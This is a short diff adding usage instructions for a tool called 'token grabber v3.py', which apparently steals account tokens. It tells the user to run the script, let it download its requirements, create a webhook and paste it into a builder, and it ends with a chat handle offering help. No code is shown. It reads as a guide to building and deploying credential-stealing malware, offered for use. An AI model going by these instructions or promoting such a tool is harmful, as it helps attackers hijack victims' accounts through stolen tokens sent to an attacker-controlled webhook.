@@ -1,0 +1,4 @@
+Run " token grabber v3.py " and it will pop up a cmd window that is gonna be fully black for a couple seconds and then download the requierments for the grabber
+then make a webhook and paste it in the builder and follow the instructions from there on! 
+
+dm me for help "! spy#0778" 
